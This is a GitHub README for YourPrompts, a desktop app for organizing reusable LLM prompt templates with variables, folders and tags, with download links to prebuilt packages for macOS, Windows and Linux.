<div align="center">

# YourPrompts

### Turn scattered prompts into a library you can actually use.

YourPrompts is a local-first desktop app for organizing, templating, and reusing prompts  
across ChatGPT, Claude, Gemini, and any other LLM.

[![Version](https://img.shields.io/badge/version-1.0-7c3aed?style=flat-square)](#project-status)
[![Platforms](https://img.shields.io/badge/platforms-macOS%20%C2%B7%20Windows%20%C2%B7%20Linux-2563eb?style=flat-square)](#download)
[![Local first](https://img.shields.io/badge/storage-local--first-059669?style=flat-square)](#why-yourprompts)
[![Languages](https://img.shields.io/badge/languages-EN%20%C2%B7%20FR%20%C2%B7%20RU-e11d48?style=flat-square)](#localization)

[Download](#download) · [Explore features](#features) · [Report an issue](https://github.com/NicolasYusim/YourPrompts/issues)

</div>

<br />

<img
  src="https://github.com/user-attachments/assets/e334e5dc-18f6-4f92-80e4-9db5e5365efa"
  alt="YourPrompts desktop application interface"
  width="100%"
/>

## Why YourPrompts?

If you work with LLMs regularly, you probably have a file, note, or workspace called **“Prompts.”** It starts simple. Then come duplicates, outdated versions, inconsistent wording, and endless copy-paste edits.

YourPrompts turns that collection into a structured, searchable template library:

- keep every prompt organized with folders and tags;
- turn repeated parts into reusable variables;
- find the right prompt in seconds;
- fill in a template and copy the finished result;
- keep your prompt library stored locally on your device.

> **Less prompt maintenance. More time using the prompts that work.**

## Dynamic templates

Write a prompt once and replace the parts that change with `{{variables}}`.

```text
Write a {{language}} function that {{task}}.
Include {{test_count}} unit tests.
```

YourPrompts automatically detects each variable and generates the matching input fields:

```text
language   → TypeScript
task       → validates an email address
test_count → 5
```

Fill in the values, and the final prompt is ready to copy:

```text
Write a TypeScript function that validates an email address.
Include 5 unit tests.
```

No repeated editing. No forgotten placeholders. No broken templates.

## Features

| | Feature | What it gives you |
| :---: | --- | --- |
| `{{ }}` | **Dynamic variables** | Turn any prompt into a reusable template with generated input fields. |
| 📁 | **Folders** | Group prompts around projects, clients, roles, or workflows. |
| 🏷️ | **Tags** | Build a flexible structure that goes beyond folders. |
| ⭐ | **Favorites** | Keep your most useful prompts one click away. |
| 🔎 | **Instant search** | Search across your prompt library without digging through documents. |
| ↕️ | **Drag & drop** | Reorder folders and tags to match the way you work. |
| 🎓 | **Interactive onboarding** | Learn the core workflow when you first launch the app. |
| 💾 | **Local-first storage** | Keep your data on your device and work offline. |

## Made for real workflows

| Role | Example templates |
| --- | --- |
| **Developers** | Code reviews, refactoring plans, test generation, technical explanations |
| **Content teams** | Social posts, briefs, rewrites, content repurposing |
| **Marketers** | Campaign concepts, ad variations, emails, audience research |
| **Product teams** | Specifications, user stories, discovery summaries, release notes |
| **Anyone working with AI** | Any prompt you want to save, adapt, and reuse |

## Download

Choose your platform below. YourPrompts is currently available as prebuilt desktop packages.

| Platform | Package | Download |
| --- | --- | :---: |
| **macOS** | `.dmg.zip` | [Download for macOS](https://github.com/NicolasYusim/YourPrompts/raw/refs/heads/main/macOS/YourPrompts.dmg.zip) |
| **Windows** | `.exe.zip` | [Download for Windows](https://github.com/NicolasYusim/YourPrompts/raw/refs/heads/main/Windows/YourPrompts.exe.zip) |
| **Linux** | Split `.7z` archive | [Part 1](https://github.com/NicolasYusim/YourPrompts/raw/refs/heads/main/Linux/YourPrompts.7z.001) · [Part 2](https://github.com/NicolasYusim/YourPrompts/raw/refs/heads/main/Linux/YourPrompts.7z.002) |

<details>
<summary><strong>How to unpack the Linux build</strong></summary>

1. Download both archive parts into the same folder.
2. Open or extract `YourPrompts.7z.001` with [7-Zip](https://www.7-zip.org/) or another tool that supports split 7z archives.
3. The second part will be detected automatically.

</details>

## Localization

The interface is available in:

- English
- French
- Russian

## Project status

The current public version is **1.0**.

YourPrompts is built with **Electron** and **React**.

## Feedback

Found a bug or have an idea that would make YourPrompts better?

[Open an issue](https://github.com/NicolasYusim/YourPrompts/issues/new) and include:

- what you expected to happen;
- what happened instead;
- your operating system;
- screenshots or steps to reproduce the problem, when possible.

## Third-party notices

Third-party software notices are available in [`THIRD_PARTY_LICENSES.txt`](https://github.com/NicolasYusim/YourPrompts/blob/main/THIRD_PARTY_LICENSES.txt).

---

<div align="center">

**Build your prompt library once. Reuse it everywhere.**

[Download YourPrompts](#download) · [View the repository](https://github.com/NicolasYusim/YourPrompts)

</div>
